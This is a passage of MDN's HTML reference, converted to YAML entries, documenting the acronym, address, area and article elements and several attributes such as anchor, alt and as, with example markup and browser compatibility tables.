[`aria-keyshortcuts`](https://www.w3.org/TR/wai-aria-1.1/#aria-keyshortcuts)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/accesskey](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/accesskey)"
- name: acronym
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<acronym\\>\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\nThe `<acronym>` [HTML](../index) element allows authors to clearly indicate a sequence of characters that compose an acronym or abbreviation for a word.\n\n**Warning:** Don't use this element. Use the [`<abbr>`](abbr) element instead.\n\n## Attributes\n\nThis element only has [global attributes](../global_attributes), which are common to all elements.\n\n## DOM Interface\n\nThis element implements the [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement) interface.\n\n## Examples\n\nhtml\n\n```\n<p>\n  The <acronym title=\"World Wide Web\">WWW</acronym> is only a component of the\n  Internet.\n</p>\n```\n\n### Result\n\n## Default styling\n\nThough the purpose of this tag is purely for the convenience of the author, its default styling varies from one browser to another:\n\n- Opera, Firefox, Chrome, and some others add a dotted underline to the content of the element.\n- A few browsers not only add a dotted underline, but also put it in small caps; to avoid this styling, adding something like [`font-variant: none`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-variant) in the CSS takes care of this case.\n\nIt is therefore recommended that web authors either explicitly style this element, or accept some cross-browser variation.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `acronym` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- The [`<abbr>`](abbr) HTML element\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/acronym](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/acronym)"
- name: action (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`action`](element/form#action)

    [`<form>`](element/form)

    The URI of a program that processes the information submitted via the form.
- name: address
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<address\\>: The Contact Address element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Faddress&level=high)\n\nThe `<address>` [HTML](../index) element indicates that the enclosed HTML provides contact information for a person or people, or for an organization.\n\n## Try it\n\n#### HTML Demo: \\<address\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>Contact the author of this page:</p>\n\n    <address>\n      <a href=\"mailto:jim@example.com\">jim@example.com</a><br />\n      <a href=\"tel:+14155550132\">+1 (415) 555‑0132</a>\n    </address>\n\n    a[href^='mailto']::before {\n      content: '📧 ';\n    }\n\n    a[href^='tel']::before {\n      content: '📞 ';\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nThe contact information provided by an `<address>` element's contents can take whatever form is appropriate for the context, and may include any type of contact information that is needed, such as a physical address, URL, email address, phone number, social media handle, geographic coordinates, and so forth. The `<address>` element should include the name of the person, people, or organization to which the contact information refers.\n\n`<address>` can be used in a variety of contexts, such as providing a business's contact information in the page header, or indicating the author of an article by including an `<address>` element within the [`<article>`](article).\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\n- The `<address>` element can only be used to represent the contact information for its nearest [`<article>`](article) or [`<body>`](body) element ancestor.\n- This element should not contain more information than the contact information, like a publication date (which belongs in a [`<time>`](time) element).\n- Typically an `<address>` element can be placed inside the [`<footer>`](footer) element of the current section, if any.\n\n## Examples\n\nThis example demonstrates the use of `<address>` to demarcate the contact information for an article's author.\n\nhtml\n\n```\n<address>\n  You can contact author at\n  <a href=\"http://www.example.com/contact\">www.example.com</a>.<br />\n  If you see any bugs, please\n  <a href=\"mailto:webmaster@example.com\">contact webmaster</a>.<br />\n  You may also want to visit us:<br />\n  Mozilla Foundation<br />\n  331 E Evelyn Ave<br />\n  Mountain View, CA 94041<br />\n  USA\n</address>\n```\n\n### Result\n\nAlthough it renders text with the same default styling as the [`<i>`](i) or [`<em>`](em) elements, it is more appropriate to use `<address>` when dealing with contact information, as it conveys additional semantic information.\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), palpable content.                                                                                                                                                                                                                                                                                                                                                                                           |\n| Permitted content                           | [Flow content](../content_categories#flow_content), but with no nested `<address>` element, no heading content ([`<hgroup>`](hgroup), [h1](heading_elements), [h2](heading_elements), [h3](heading_elements), [h4](heading_elements), [h5](heading_elements), [h6](heading_elements)), no sectioning content ([`<article>`](article), [`<aside>`](aside), [`<section>`](section), [`<nav>`](nav)), and no [`<header>`](header) or [`<footer>`](footer) element. |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                                                                                                                                                                                                           |\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content), but always excluding `<address>` elements (according to the logical principle of symmetry, if `<address>` tag, as a parent, can not have nested `<address>` element, then the same `<address>` content can not have `<address>` tag as its parent).                                                                                                                                |\n| Implicit ARIA role                          | [`group`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/group_role)                                                                                                                                                                                                                                                                                                                                                                     |\n| Permitted ARIA roles                        | Any                                                                                                                                                                                                                                                                                                                                                                                                                                                             |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement) Prior to Gecko 2.0 (Firefox 4), Gecko implemented this element using the [`HTMLSpanElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLSpanElement) interface                                                                                                                                                                                                          |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `address` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- Others section-related elements: [`<body>`](body), [`<nav>`](nav), [`<article>`](article), [`<aside>`](aside), [h1](heading_elements), [h2](heading_elements), [h3](heading_elements), [h4](heading_elements), [h5](heading_elements), [h6](heading_elements), [`<hgroup>`](hgroup), [`<footer>`](footer), [`<section>`](section), [`<header>`](header);\n- [Sections and outlines of an HTML document](heading_elements).\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/address](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/address)"
- name: align (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    `align` Deprecated

    [`<caption>`](element/caption), [`<col>`](element/col), [`<colgroup>`](element/colgroup), [`<hr>`](element/hr), [`<iframe>`](element/iframe), [`<img>`](element/img), [`<table>`](element/table), [`<tbody>`](element/tbody), [`<td>`](element/td), [`<tfoot>`](element/tfoot), [`<th>`](element/th), [`<thead>`](element/thead), [`<tr>`](element/tr)

    Specifies the horizontal alignment of the element.
- name: allow (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`allow`](element/iframe#allow)

    [`<iframe>`](element/iframe)

    Specifies a feature-policy for the iframe.
- name: alt (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`alt`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/alt)

    [`<area>`](element/area), [`<img>`](element/img), [`<input>`](element/input)

    Alternative text in case an image can't be displayed.
- name: anchor (attribute)
  summary: 'Non-standard: This feature is non-standard and is not on a standards track'
  description: "# anchor\n\n**Non-standard:** This feature is non-standard and is not on a standards track. Do not use it on production sites facing the Web: it will not work for every user. There may also be large incompatibilities between implementations and the behavior may change in the future.\n\n**Experimental:** **This is an [experimental technology](https://developer.mozilla.org/en-US/docs/MDN/Writing_guidelines/Experimental_deprecated_obsolete#experimental)**  \nCheck the [Browser compatibility table](#browser_compatibility) carefully before using this in production.\n\nThe `anchor` [global attribute](../global_attributes) is used to associate a positioned element with an anchor element. The attribute's value is the [`id`](id) value of the element you want to anchor the positioned element to. The element can then be positioned using [CSS anchor positioning](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_anchor_positioning/Using).\n\n**Note:** Alternatively, you can associate a positioned element with an anchor element via CSS, using the [`anchor-name`](https://developer.mozilla.org/en-US/docs/Web/CSS/anchor-name) and [`position-anchor`](https://developer.mozilla.org/en-US/docs/Web/CSS/position-anchor) properties. If both anchoring techniques are used on the same element, the CSS technique takes precedence over the HTML technique.\n\n## Examples\n\n### Basic `anchor` attribute usage\n\nThe following example uses HTML to associate a positioned element with an anchor. CSS is then used to tether the positioned element to the right of the anchor.\n\n#### HTML\n\nWe create a [`<div>`](../element/div) element with an `id` of `example-anchor`. This is our anchor element. We then include another `<div>` with the `anchor` attribute set to `example-anchor`. This designates the first `<div>` as the anchor for the second `<div>`, associating the two together.\n\nWe also include some filler text around the two `<div>`s to make the [`<body>`](../element/body) taller so that it will scroll.\n\nhtml\n\n```\n<p>\n  Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor\n  incididunt ut labore et dolore magna aliqua. Dui nunc mattis enim ut tellus\n  elementum sagittis vitae et.\n</p>\n\n<div class=\"anchor\" id=\"example-anchor\">⚓︎</div>\n\n<div class=\"infobox\" anchor=\"example-anchor\">\n  <p>This is an information box.</p>\n</div>\n\n<p>\n  Nisi quis eleifend quam adipiscing vitae proin sagittis nisl rhoncus. In arcu\n  cursus euismod quis viverra nibh cras pulvinar. Vulputate ut pharetra sit amet\n  aliquam.\n</p>\n\n<p>\n  Malesuada nunc vel risus commodo viverra maecenas accumsan lacus. Vel elit\n  scelerisque mauris pellentesque pulvinar pellentesque habitant morbi\n  tristique. Porta lorem mollis aliquam ut porttitor. Turpis cursus in hac\n  habitasse platea dictumst quisque. Dolor sit amet consectetur adipiscing elit.\n  Ornare lectus sit amet est placerat. Nulla aliquet porttitor lacus luctus\n  accumsan.\n</p>\n```\n\n#### CSS\n\nWe use CSS to convert the `infobox` element into an *anchor-positioned element* and position it relative to its anchor. We set its:\n\n- [`position`](https://developer.mozilla.org/en-US/docs/Web/CSS/position) property to `fixed`, converting it to a positioned element so it can be positioned relative to the anchor's position.\n- [`left`](https://developer.mozilla.org/en-US/docs/Web/CSS/left) property to an [`anchor()`](https://developer.mozilla.org/en-US/docs/Web/CSS/anchor) function with a value of `right`. This tethers the positioned element to its anchor, positioning its left edge flush to the anchor's right edge.\n- [`align-self`](https://developer.mozilla.org/en-US/docs/Web/CSS/align-self) property to [`anchor-center`](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_anchor_positioning/Using#centering_on_the_anchor_using_anchor-center). This causes the infobox to be aligned centrally to the center of the anchor in the inline direction.\n- [`margin-left`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin-left) to `10px`, creating space between the anchor-positioned element and its anchor.\n\ncss\n\n```\n.infobox {\n  position: fixed;\n  left: anchor(right);\n  align-self: anchor-center;\n  margin-left: 10px;\n}\n```\n\n#### Result\n\nScroll the example to see how the infobox is tethered to the anchor. When the `anchor` attribute is supported, the infobox will be fixed to the right of the anchor. If not supported, the infobox will be fixed to the viewport.\n\n## Specifications\n\nThis attribute is not currently part of the HTML specification. Read the discussion about adding the `anchor` attribute at [https://github.com/whatwg/html/pull/9144](https://github.com/whatwg/html/pull/9144).\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `anchor` | preview | No   | No      | No    | No     | No             | No                  | No            | No            | No               | No              |     |\n\n## See also\n\n- [`HTMLElement.anchorElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/anchorElement)\n- CSS [`anchor-name`](https://developer.mozilla.org/en-US/docs/Web/CSS/anchor-name) property\n- CSS [`position-anchor`](https://developer.mozilla.org/en-US/docs/Web/CSS/position-anchor) property\n- [CSS anchor positioning](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_anchor_positioning) module\n- [Using CSS anchor positioning](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_anchor_positioning/Using) guide\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/anchor](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/anchor)"
- name: area
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<area\\>: The Image Map Area element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Farea&level=high)\n\nThe `<area>` [HTML](../index) element defines an area inside an image map that has predefined clickable areas. An *image map* allows geometric areas on an image to be associated with [hypertext links](https://developer.mozilla.org/en-US/docs/Glossary/Hyperlink).\n\nThis element is used only within a [`<map>`](map) element.\n\n## Try it\n\n#### HTML Demo: \\<area\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <map name=\"infographic\">\n      <area\n        shape=\"poly\"\n        coords=\"129,0,260,95,129,138\"\n        href=\"https://developer.mozilla.org/docs/Web/HTTP\"\n        target=\"_blank\"\n        alt=\"HTTP\" />\n      <area\n        shape=\"poly\"\n        coords=\"260,96,209,249,130,138\"\n        href=\"https://developer.mozilla.org/docs/Web/HTML\"\n        target=\"_blank\"\n        alt=\"HTML\" />\n      <area\n        shape=\"poly\"\n        coords=\"209,249,49,249,130,139\"\n        href=\"https://developer.mozilla.org/docs/Web/JavaScript\"\n        target=\"_blank\"\n        alt=\"JavaScript\" />\n      <area\n        shape=\"poly\"\n        coords=\"48,249,0,96,129,138\"\n        href=\"https://developer.mozilla.org/docs/Web/API\"\n        target=\"_blank\"\n        alt=\"Web APIs\" />\n      <area\n        shape=\"poly\"\n        coords=\"0,95,128,0,128,137\"\n        href=\"https://developer.mozilla.org/docs/Web/CSS\"\n        target=\"_blank\"\n        alt=\"CSS\" />\n    </map>\n    <img usemap=\"#infographic\" src=\"/media/examples/mdn-info.png\" alt=\"MDN infographic\" />\n\n    img {\n      display: block;\n      margin: 0 auto;\n      width: 260px;\n      height: 260px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element's attributes include the [global attributes](../global_attributes).\n\n[`alt`](#alt)  \nA text string alternative to display on browsers that do not display images. The text should be phrased so that it presents the user with the same kind of choice as the image would offer when displayed without the alternative text. This attribute is required only if the [`href`](#href) attribute is used.\n\n[`coords`](#coords)  \nThe `coords` attribute details the coordinates of the [`shape`](#shape) attribute in size, shape, and placement of an `<area>`. This attribute must not be used if `shape` is set to `default`.\n\n- `rect`: the value is `x1,y1,x2,y2`. The value specifies the coordinates of the top-left and bottom-right corner of the rectangle. For example, in `<area shape=\"rect\" coords=\"0,0,253,27\" href=\"#\" target=\"_blank\" alt=\"Mozilla\">` the coordinates are `0,0` and `253,27`, indicating the top-left and bottom-right corners of the rectangle, respectively.\n- `circle`: the value is `x,y,radius`. Value specifies the coordinates of the circle center and the radius. For example: `<area shape=\"circle\" coords=\"130,136,60\" href=\"#\" target=\"_blank\" alt=\"MDN\">`\n- `poly`: the value is `x1,y1,x2,y2,..,xn,yn`. Value specifies the coordinates of the edges of the polygon. If the first and last coordinate pairs are not the same, the browser will add the last coordinate pair to close the polygon\n\nThe values are numbers of CSS pixels.\n\n[`download`](#download)  \nThis attribute, if present, indicates that the author intends the hyperlink to be used for downloading a resource. See [`<a>`](a) for a full description of the [`download`](a#download) attribute.\n\n[`href`](#href)  \nThe hyperlink target for the area. Its value is a valid URL. This attribute may be omitted; if so, the `<area>` element does not represent a hyperlink.\n\n[`ping`](#ping)  \nContains a space-separated list of URLs to which, when the hyperlink is followed, [`POST`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST) requests with the body `PING` will be sent by the browser (in the background). Typically used for tracking.\n\n[`referrerpolicy`](#referrerpolicy)  \nA string indicating which referrer to use when fetching the resource:\n\n- `no-referrer`: The [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header will not be sent.\n- `no-referrer-when-downgrade`: The [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header will not be sent to [origin](https://developer.mozilla.org/en-US/docs/Glossary/Origin)s without [TLS](https://developer.mozilla.org/en-US/docs/Glossary/TLS) ([HTTPS](https://developer.mozilla.org/en-US/docs/Glossary/HTTPS)).\n- `origin`: The sent referrer will be limited to the origin of the referring page: its [scheme](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Web_mechanics/What_is_a_URL), [host](https://developer.mozilla.org/en-US/docs/Glossary/Host), and [port](https://developer.mozilla.org/en-US/docs/Glossary/Port).\n- `origin-when-cross-origin`: The referrer sent to other origins will be limited to the scheme, the host, and the port. Navigations on the same origin will still include the path.\n- `same-origin`: A referrer will be sent for [same origin](https://developer.mozilla.org/en-US/docs/Glossary/Same-origin_policy), but cross-origin requests will contain no referrer information.\n- `strict-origin`: Only send the origin of the document as the referrer when the protocol security level stays the same (HTTPS→HTTPS), but don't send it to a less secure destination (HTTPS→HTTP).\n- `strict-origin-when-cross-origin` (default): Send a full URL when performing a same-origin request, only send the origin when the protocol security level stays the same (HTTPS→HTTPS), and send no header to a less secure destination (HTTPS→HTTP).\n- `unsafe-url`: The referrer will include the origin *and* the path (but not the [fragment](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/hash), [password](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/password), or [username](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/username)). **This value is unsafe**, because it leaks origins and paths from TLS-protected resources to insecure origins.\n\n[`rel`](../attributes/rel)  \nFor anchors containing the [`href`](#href) attribute, this attribute specifies the relationship of the target object to the link object. The value is a space-separated list of link types. The values and their semantics will be registered by some authority that might have meaning to the document author. The default relationship, if no other is given, is void. Use this attribute only if the [`href`](#href) attribute is present.\n\n[`shape`](#shape)  \nThe shape of the associated hot spot. The specifications for HTML defines the values `rect`, which defines a rectangular region; `circle`, which defines a circular region; `poly`, which defines a polygon; and `default`, which indicates the entire region beyond any defined shapes.\n\n[`target`](#target)  \nA keyword or author-defined name of the [browsing context](https://developer.mozilla.org/en-US/docs/Glossary/Browsing_context) to display the linked resource. The following keywords have special meanings:\n\n- `_self` (default): Show the resource in the current browsing context.\n- `_blank`: Show the resource in a new, unnamed browsing context.\n- `_parent`: Show the resource in the parent browsing context of the current one, if the current page is inside a frame. If there is no parent, acts the same as `_self`.\n- `_top`: Show the resource in the topmost browsing context (the browsing context that is an ancestor of the current one and has no parent). If there is no parent, acts the same as `_self`.\n\nUse this attribute only if the [`href`](#href) attribute is present.\n\n**Note:** Setting `target=\"_blank\"` on `<area>` elements implicitly provides the same `rel` behavior as setting [`rel=\"noopener\"`](../attributes/rel/noopener) which does not set `window.opener`. See [browser compatibility](#browser_compatibility) for support status.\n\n## Examples\n\nhtml\n\n```\n<map name=\"primary\">\n  <area\n    shape=\"circle\"\n    coords=\"75,75,75\"\n    href=\"left.html\"\n    alt=\"Click to go Left\" />\n  <area\n    shape=\"circle\"\n    coords=\"275,75,75\"\n    href=\"right.html\"\n    alt=\"Click to go Right\" />\n</map>\n<img\n  usemap=\"#primary\"\n  src=\"https://dummyimage.com/350x150\"\n  alt=\"350 x 150 pic\" />\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                |\n|---------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content).                                                                                                                                |\n| Permitted content                           | None; it is a [void element](https://developer.mozilla.org/en-US/docs/Glossary/Void_element).                                                                                                                                                  |\n| Tag omission                                | Must have a start tag and must not have an end tag.                                                                                                                                                                                            |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content). The `<area>` element must have an ancestor [`<map>`](map), but it need not be a direct parent.                                                            |\n| Implicit ARIA role                          | [`link`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/link_role) when [`href`](#href) attribute is present, otherwise [`generic`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/generic_role) |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                                                                                                                                            |\n| DOM interface                               | [`HTMLAreaElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAreaElement)                                                                                                                                                          |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/area](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/area)"
- name: article
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<article\\>: The Article Contents element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Farticle&level=high)\n\nThe `<article>` [HTML](../index) element represents a self-contained composition in a document, page, application, or site, which is intended to be independently distributable or reusable (e.g., in syndication). Examples include: a forum post, a magazine or newspaper article, or a blog entry, a product card, a user-submitted comment, an interactive widget or gadget, or any other independent item of content.\n\n## Try it\n\n#### HTML Demo: \\<article\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <article class=\"forecast\">\n      <h1>Weather forecast for Seattle</h1>\n      <article class=\"day-forecast\">\n        <h2>03 March 2018</h2>\n        <p>Rain.</p>\n      </article>\n      <article class=\"day-forecast\">\n        <h2>04 March 2018</h2>\n        <p>Periods of rain.</p>\n      </article>\n      <article class=\"day-forecast\">\n        <h2>05 March 2018</h2>\n        <p>Heavy rain.</p>\n      </article>\n    </article>\n\n    .forecast {\n      margin: 0;\n      padding: 0.3rem;\n      background-color: #eee;\n    }\n\n    .forecast > h1,\n    .day-forecast {\n      margin: 0.5rem;\n      padding: 0.3rem;\n      font-size: 1.2rem;\n    }\n\n    .day-forecast {\n      background: right/contain content-box border-box no-repeat\n        url('/media/examples/rain.svg') white;\n    }\n\n    .day-forecast > h2,\n    .day-forecast > p {\n      margin: 0.2rem;\n      font-size: 1rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nA given document can have multiple articles in it; for example, on a blog that shows the text of each article one after another as the reader scrolls, each post would be contained in an `<article>` element, possibly with one or more `<section>`s within.\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\n- Each `<article>` should be identified, typically by including a heading ([`<h1>` - `<h6>`](heading_elements) element) as a child of the `<article>` element.\n- When an `<article>` element is nested, the inner element represents an article related to the outer element. For example, the comments of a blog post can be `<article>` elements nested in the `<article>` representing the blog post.\n- Author information of an `<article>` element can be provided through the [`<address>`](address) element, but it doesn't apply to nested `<article>` elements.\n- The publication date and time of an `<article>` element can be described using the [`datetime`](time#datetime) attribute of a [`<time>`](time) element.\n\n## Examples\n\nhtml\n\n```\n<article class=\"film_review\">\n  <h2>Jurassic Park</h2>\n  <section class=\"main_review\">\n    <h3>Review</h3>\n    <p>Dinos were great!</p>\n  </section>\n  <section class=\"user_reviews\">\n    <h3>User reviews</h3>\n    <article class=\"user_review\">\n      <h4>Too scary!</h4>\n      <p>Way too scary for me.</p>\n      <footer>\n        <p>\n          Posted on\n          <time datetime=\"2015-05-16 19:00\">May 16</time>\n          by Lisa.\n        </p>\n      </footer>\n    </article>\n    <article class=\"user_review\">\n      <h4>Love the dinos!</h4>\n      <p>I agree, dinos are my favorite.</p>\n      <footer>\n        <p>\n          Posted on\n          <time datetime=\"2015-05-17 19:00\">May 17</time>\n          by Tom.\n        </p>\n      </footer>\n    </article>\n  </section>\n  <footer>\n    <p>\n      Posted on\n      <time datetime=\"2015-05-15 19:00\">May 15</time>\n      by Staff.\n    </p>\n  </footer>\n</article>\n```\n\n### Result\n\n## Technical summary\n\n|                                             ||\n|---------------------------------------------||\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [sectioning content](../content_categories#sectioning_content), [palpable content](../content_categories#palpable_content|\n| Permitted content                           | [Flow content](../content_categories#flow_content|\n| Tag omission                                | None, both the starting and ending tag are mandatory|\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content). Note that an `<article>` element must not be a descendant of an [`<address>`](address) element|\n| Implicit ARIA role                          | [`article`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/article_role)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |\n| Permitted ARIA roles                        | [`application`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/application_role), [`document`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/document_role), [`feed`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/feed_role), [`main`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/main_role), [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role), [`region`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/region_role) |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `article` | 5       | 12   | 4       | 11.1  | 5      | 18             | 4                   | 11.1          | 4.2           | 1.0              | 4.4             |     |\n\n## See also\n\n- Other section-related elements: [`<body>`](body), [`<nav>`](nav), [`<section>`](section), [`<aside>`](aside), [h1](heading_elements), [h2](heading_elements), [h3](heading_elements), [h4](heading_elements), [h5](heading_elements), [h6](heading_elements), [`<hgroup>`](hgroup), [`<header>`](header), [`<footer>`](footer), [`<address>`](address)\n- [Using HTML sections and outlines](heading_elements)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/article](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/article)"
- name: as (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`as`](element/link#as)

    [`<link>`](element/link)

    Specifies the type of content being loaded by the link.
- name: aside
  summary: This feature is well established and works across many devices and browser versions
